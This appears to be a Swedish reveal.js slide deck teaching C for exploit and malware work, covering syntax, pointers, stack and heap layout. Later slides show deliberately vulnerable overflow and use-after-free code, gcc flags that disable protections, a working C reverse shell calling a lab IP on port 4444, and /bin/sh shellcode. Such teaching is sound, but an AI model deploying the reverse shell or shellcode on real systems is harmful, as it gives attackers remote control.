@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>C Crash Course</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/black.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css">
+  <style>
+    .reveal pre code { font-size: 1.15em; }
+    .reveal ul, .reveal ol { font-size: 1.2em; }
+  </style>
+</head>
+<body>
+<div class="reveal">
+  <div class="slides">
+
+<!-- DEL 1: Hello World och C-syntax -->
+
+<section>
+  <h2>C Crash Course</h2>
+  <h3>Del 1: Hello World och C-syntax</h3>
+</section>
+
+<section>
+  <h3>Varför C?</h3>
+  <ul>
+    <li>Nästan all låg-nivå kod inom exploits, malware och shellcode är C eller C-liknande.</li>
+    <li>För att förstå exploits och payloads måste du kunna läsa och ibland modifiera C.</li>
+    <li>C är “nära maskinen” – ger full kontroll över minnet, stacken, anrop.</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Hur ser ett C-program ut?</h3>
+  <ul>
+    <li>Koden ligger i en fil, t.ex. <code>hello.c</code></li>
+    <li>Programmet startar alltid i funktionen <code>main()</code></li>
+  </ul>
+</section>
+
+<section>
+  <h3>Hello World – Exempel</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main() {
+    printf("Hello, world!\n");
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <h3>Kompilera (Linux)</h3>
+  <ol>
+    <li>GCC</li>
+    <li>Clang</li>
+    <li>Makefile</li>
+  </ol>
+</section>
+
+<section>
+  <h3>Kompilera (Windows)</h3>
+  <ol>
+    <li>MinGW/GCC</li>
+    <li>Visual Studio</li>
+    <li>Cygwin</li>
+  </ol>
+</section>
+
+<section>
+  <h3>Vad är speciellt med C?</h3>
+  <ul>
+    <li>Ingen tolk – du måste kompilera</li>
+    <li>Minneshantering är ditt ansvar</li>
+    <li>Alla rader avslutas med <code>;</code></li>
+    <li>Variabler måste deklareras med typ</li>
+    <li>All kod ligger i funktioner</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Programfilens uppbyggnad</h3>
+  <ul>
+    <li>Direktiv (t.ex. <code>#include</code>)</li>
+    <li>Globala variabler/konstanter (frivilligt)</li>
+    <li>Funktioner (<code>main</code> krävs!)</li>
+  </ul>
+</section>
+
+<section>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int global_counter = 0;
+
+int add(int a, int b) {
+    return a + b;
+}
+
+int main() {
+    int result = add(3, 4);
+    printf("Resultat: %d\n", result);
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <pre><code class="language-c">if (x > 0) {
+    printf("x är positivt!\n");
+} else {
+    printf("x är noll eller negativt.\n");
+}</code></pre>
+</section>
+
+<section>
+  <h3>Kommentarer i C</h3>
+  <ul>
+    <li>En rad: <code>// kommentar</code></li>
+    <li>Flera rader:</li>
+  </ul>
+  <pre><code class="language-c">/* Detta är
+   en kommentar
+   över flera rader */</code></pre>
+</section>
+
+<section>
+  <h3>Variabler & Datatyper</h3>
+  <ul>
+    <li><code>int</code> – heltal</li>
+    <li><code>float</code> – decimaltal</li>
+    <li><code>char</code> – tecken</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Exempel på variabler</h3>
+  <pre><code class="language-c">int x = 42;
+float y = 3.14;
+char c = 'A';</code></pre>
+
+<pre><code class="language-c">char name[] = "Bobbo";
+char msg[20] = "Hello!";
+</code></pre>
+<p>  I C finns ingen egen strängtyp. Hantering av text görs via pekare och char-arrayer.</p>
+</section>
+
+<section>
+  <pre><code>int main() {
+    int x = 10;
+    float y = 2.5;
+    char c = 'Z';
+    double big = 1.23456789;
+    unsigned int flag = 1;
+    char name[] = "Bobbo the king";
+
+    printf("x=%d, y=%.2f, c=%c, big=%f, flag=%u, name=%s\n",
+        x, y, c, big, flag, name);
+
+    return 0;
+}</code></pre>
+</section>
+
+
+<section>
+  <h3>Inför WinAPI</h3>
+  <ul style="font-size:0.7em;">
+  <li>Windows-API använder ofta `DWORD` (unsigned 32-bit int), `HANDLE` (pekare), och strängar som `wchar_t*` för Unicode.</li>
+  <li>Allokera tillräckligt med minne när du hanterar strängar för filvägar eller kommandon.</li>
+  <li>Pekare (mer om detta senare) är centralt för att arbeta med arrays, strängar och dynamisk minneshantering.</li>
+</ul>
+</section>
+
+
+<section>
+  <h3>Funktioner</h3>
+  <ul>
+    <li>Definieras med typ, namn, parenteser</li>
+    <li><code>main</code> är alltid startpunkt!</li>
+  </ul>
+</section>
+
+<section>
+  <pre><code class="language-c">int square(int n) {
+    return n * n;
+}
+</code></pre>
+</section>
+
+<section>
+  <h3>Whitespace & Indentering</h3>
+  <ul>
+    <li>C ignorerar extra mellanslag/radbrytningar</li>
+    <li>Indentering gör koden mer läsbar</li>
+  </ul>
+</section>
+
+<section>
+  <pre><code class="language-c">if (y > 0) {
+    printf("y är positivt!\n");
+}</code></pre>
+</section>
+
+<section>
+  <h3>Exempel: Loop</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main() {
+    for (int i = 0; i < 5; i++) {
+        printf("i: %d\n", i);
+    }
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <h3>Exempel: Input/Output</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main() {
+    char name[20];
+    printf("Vad heter du? ");
+    scanf("%19s", name);
+    printf("Hej, %s!\n", name);
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <h3>Tips</h3>
+  <ul>
+    <li>Kompilera ofta (<code>gcc program.c -o program</code>)</li>
+    <li>Läs felmeddelanden noga</li>
+    <li>Skriv enkel och tydlig kod</li>
+  </ul>
+</section>
+
+
+<section>
+  <h2>Del 2: Variabler, pekare och minne</h2>
+</section>
+
+<section>
+  <h3>Varför?</h3>
+  <ul>
+    <li>Många exploits bygger på minneshantering, pekare och variabler.</li>
+    <li>Buffer overflows, use-after-free, m.m. handlar om hur C hanterar minne.</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Variabler & Datatyper</h3>
+  <ul>
+    <li>C kräver att du deklarerar typ före användning</li>
+    <li>Exempel:</li>
+  </ul>
+</section>
+
+<section>
+  <pre><code class="language-c">int antal = 666;
+char bokstav = 'A';
+float pi = 3.14;
+char namn[20] = "Bobbo";</code></pre>
+</section>
+
+<section>
+  <h3>Pekare (<code>*</code> och <code>&</code>)</h3>
+  <ul style="font-size:0.9em;">
+    <li>En <b>pekare</b> är en variabel som lagrar adressen 
+      till en annan variabel i minnet – inte själva värdet, utan "platsen där värdet finns".</li>
+    <li>Manipulation av pekare är kärnan i många exploits</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Pekare – Exempel</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+int main() {
+    int a = 7;
+    int *p = &a;
+
+    printf("a = %d\n", a);
+    printf("p = %p\n", (void*)p);
+    printf("*p = %d\n", *p);
+    return 0;
+}
+</code></pre>
+</section>
+
+<section>
+  <h3>Pekarvisualisering</h3>
+  <table>
+    <tr><th>Variabel</th><th>Värde</th><th>Adress</th></tr>
+    <tr><td>a</td><td>7</td><td>0x1000</td></tr>
+    <tr><td>p</td><td>0x1000</td><td>0x2000</td></tr>
+  </table>
+  <ul>
+    <li><code>p</code> innehåller adressen till <code>a</code></li>
+    <li><code>*p</code> hämtar värdet på adressen</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Varför pekare används</h3>
+  <ul>
+    <li>Direkt åtkomst till minnet</li>
+    <li>Skicka stora strukturer/arrayer till funktioner</li>
+    <li>Dynamisk minneshantering</li>
+    <li>Hantering av strängar/arrays</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Strängar och arrayer</h3>
+  <ul>
+    <li>I C är en sträng en array av <code>char</code> med <code>\0</code> i slutet</li>
+    <li>Buffer overflows: array för liten eller okontrollerad</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Arrayexempel</h3>
+  <pre><code class="language-c">char buf[10];
+strcpy(buf, "hej"); // Kopierar in "hej" i buf
+</code></pre>
+  <p><code>strcpy</code> kan vara farligt – mer i del 3!</p>
+</section>
+
+<section>
+  <h2>"Farliga" exempel</h2>
+  </section>
+
+  <section>
+    <h3>Use-After-Free</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    int *p = malloc(sizeof(int));
+    *p = 42;
+    printf("Innan free: %d\n", *p);
+    free(p);        
+
+    
+    printf("Efter free: %d\n", *p); 
+    return 0;
+}</code></pre>
+</section>
+
+  <section>
+    <h3>Buffer overflow</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    char buf[8];
+    strcpy(buf, "Detta är för långt!");
+    printf("%s\n", buf);
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <h2>Del 3: Input/Output och klassiska sårbarheter</h2>
+</section>
+
+<section>
+  <h3>Vanliga I/O-funktioner</h3>
+  <ul>
+    <li><code>printf</code> – skriver ut data</li>
+    <li><code>scanf</code> – läser in data (ofta sårbar!)</li>
+    <li><code>gets</code> – Läser in en rad text (sårbar)</li>
+    <li><code>fgets</code> – med längdkontroll (säkrare)</li>
+  </ul>
+</section>
+
+<section>
+  <h3>I/O-exempel</h3>
+  <pre><code class="language-c">char buf[50];
+printf("Skriv något: ");
+fgets(buf, sizeof(buf), stdin);
+printf("Du skrev: %s\n", buf);
+</code></pre>
+</section>
+
+<section>
+  <h3>Farliga funktioner</h3>
+  <ul>
+    <li><code>gets()</code> – ingen längdkontroll, buffer overflow</li>
+    <li><code>scanf("%s", buf)</code> – måste ange maxlängd!</li>
+    <li><code>strcpy()</code> – ingen kontroll på bufferstorlek</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Sårbara kodexempel</h3>
+  <pre><code class="language-c">char buf[10];
+gets(buf); 
+scanf("%s", buf); 
+strcpy(buf, "väldigtlångsträng"); 
+</code></pre>
+</section>
+
+<section>
+  <h3>Stack Overflow – Demo</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[32];
+    printf("Input: ");
+    gets(buf); /
+    printf("Du skrev: %s\n", buf);
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+</section>
+
+<section>
+  <h3>Säkrare I/O</h3>
+  <pre><code class="language-c">fgets(buf, sizeof(buf), stdin); 
+scanf("%9s", buf); 
+</code></pre>
+  <ul>
+    <li>Använd alltid längdkontroll på input!</li>
+  </ul>
+</section>
+
+
+<section>
+  <h2>Del 4: Stack/Heap och minneslayout</h2>
+</section>
+
+<section>
+  <h3>Viktigt</h3>
+  <ul>
+    <li>För att förstå exploits och low-level hacking måste du veta hur minnet är organiserat</li>
+    <li>Buffer overflows, use-after-free, heap exploits m.m. bygger på stacken/heapen</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Minneslayout i ett C-program</h3>
+  <pre><code>|--------------|
+|   Stack      | <- Lokala variabler, funktionsanrop
+|--------------|
+|   Heap       | <- Dynamiskt minne (malloc/free)
+|--------------|
+| Data segment | <- Globala/Statiska variabler
+|--------------|
+|   Text       | <- Programkod
+|--------------|
+</code></pre>
+</section>
+
+<section>
+  <h3>Stacken</h3>
+  <ul>
+    <li>Stacken är ett område i minnet som används automatiskt när programmet körs</li>
+    <li>Lagrar lokala variabler, funktionsanrop, return address</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Stackvariabler – Exempel</h3>
+  <pre><code class="language-c">void vuln() {
+    char buf[32];
+    int a = 1337;
+    // ...
+}
+</code></pre>
+</section>
+
+<section>
+  <h3>Stack overflow – Visualisering</h3>
+  <pre><code>|--------------|
+| return addr  |  <--- ditt mål vid overflow
+|--------------|
+|   a (1337)   |
+|--------------|
+|   buf[32]    |
+|--------------|
+</code></pre>
+</section>
+
+<section>
+  <h3>Heapen</h3>
+  <ul>
+    <li>Dynamiskt minne via malloc/free</li>
+    <li>Heapen växer uppåt i minnet</li>
+    <li>Buggar: Heap overflow, use-after-free, double free</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Heap-allokering – Exempel</h3>
+  <pre><code class="language-c">#include &lt;stdlib.h&gt;
+char *p = malloc(128); // 128 bytes på heapen
+strcpy(p, "test");
+free(p);
+</code></pre>
+</section>
+
+<section>
+  <h3>Vanliga heap-sårbarheter</h3>
+  <li>Heap overflow</li>
+  <li>Use-after-free</li>
+  <li>Double free</li>
+  <li>Memory leak</li>
+</section>
+
+<section>
+  <h3>Return address & stack frames</h3>
+  <ul>
+    <li>Vid funktionsanrop sparas return address på stacken</li>
+    <li>Vid buffer overflow kan du skriva över return address och ta kontroll</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Praktiskt exempel – overflow</h3>
+  <pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[8];
+    printf("Input: ");
+    gets(buf); // Sårbart!
+}
+
+int main() {
+    vuln();
+    printf("Klar!\n");
+    return 0;
+}</code></pre>
+</section>
+
+
+<section>
+  <h2>Del 5: Kompilera och testa exploits</h2>
+</section>
+
+<section>
+  <h3>Viktigt</h3>
+  <ul>
+    <li>Lär dig praktiskt vad som händer vid sårbarhet</li>
+    <li>Se effekten av skyddsmekanismer (kompilatorflaggor, ASLR, stack canaries)</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Kompilera med och utan skydd</h3>
+  <table>
+    <thead>
+      <tr><th>Flagg</th><th>Skydd</th><th>Effekt</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>-fno-stack-protector</td><td>Stack canary</td><td>Tar bort skydd mot stack overflow</td></tr>
+      <tr><td>-z execstack</td><td>No-eXecute (NX)</td><td>Gör stacken körbar</td></tr>
+      <tr><td>-no-pie</td><td>Position Independent Exec</td><td>Förutsägbara minnesadresser</td></tr>
+      <tr><td>-g</td><td>Debug info</td><td>Lägger till symboler</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section>
+  <h3>Kompilera – Exempel</h3>
+  <pre><code class="language-bash">gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln</code></pre>
+</section>
+
+<section>
+  <h3>Vad händer med skydd aktiverat?</h3>
+  <pre><code class="language-bash">gcc vuln.c -o vuln</code></pre>
+  <ul>
+    <li>Stack canary, ASLR, NX aktiverat på moderna system</li>
+    <li>Overflow-exploiten kan misslyckas, “Stack smashing detected” eller direkt crash</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Undersök binären med <code>checksec</code></h3>
+  <pre><code class="language-bash">checksec --file=./vuln</code></pre>
+  <ul>
+    <li>NX = No-execute (förhindrar kod på stack/heap)</li>
+    <li>Canary = Upptäcker/stoppar overflow</li>
+    <li>PIE = Programmet laddas på slumpad adress</li>
+    <li>RELRO = Extra skydd</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Bonus: Debugga med gdb</h3>
+  <ol>
+    <li>Starta: <code>gdb ./vuln</code></li>
+    <li>Sätt breakpoint: <code>break vuln</code></li>
+    <li>Kör: <code>run</code></li>
+    <li>Stega: <code>next</code> och <code>step</code></li>
+    <li>Visa register, stack och variabler: <code>info registers</code>, <code>x/16x $rsp</code>, <code>print buf</code></li>
+  </ol>
+</section>
+
+<section>
+  <h2>Del 6: Malware och shellcode basics</h2>
+</section>
+
+<section>
+  <h3>Intro</h3>
+  <ul>
+    <li>De flesta reverse shells, exploits och shellcode skrivs i C/asm</li>
+    <li>Reverse engineering bygger på att tolka C-kod</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Reverse Shell i C</h3>
+  <p>En reverse shell är ett klassiskt mål: Få offret att ansluta till dig och ge ett shell</p>
+</section>
+
+<section>
+  <h3>Exempel: Reverse shell (Linux, enkel variant)</h3>
+  <pre><code class="language-c" style="font-size: 0.5em;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;sys/socket.h&gt;
+
+int main(void) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in attacker;
+
+    attacker.sin_family = AF_INET;
+    attacker.sin_port = htons(4444); 
+    attacker.sin_addr.s_addr = inet_addr("10.10.14.42"); 
+
+    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
+    dup2(sock, 0);  // stdin
+    dup2(sock, 1);  // stdout
+    dup2(sock, 2);  // stderr
+    execve("/bin/sh", NULL, NULL);
+    return 0;
+}
+</code></pre>
+</section>
+
+<section>
+  <h3>Reverse shell</h3>
+  <ul>
+    <li>Starta en <code>nc -lvnp 4444</code> på din maskin</li>
+    <li>Kompilera & kör</li>
+    <li>Du får en shell till din listener</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Vad är shellcode?</h3>
+  <ul>
+    <li>Shellcode är maskinkod (bytes) som används i exploits</li>
+    <li>Kan vara C eller asm, kompilerad till bytes</li>
+  </ul>
+</section>
+
+<section>
+  <h3>Shellcode – Exempel</h3>
+  <pre><code class="language-c">unsigned char shellcode[] =
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
+"\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main() {
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}</code></pre>
+  <p>Detta ger en <code>/bin/sh</code> på gamla Linux (32-bitars)</p>
+</section>
+
+  </div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<script>Reveal.initialize({ hash: true });hljs.highlightAll();</script>
+</body>
+</html>
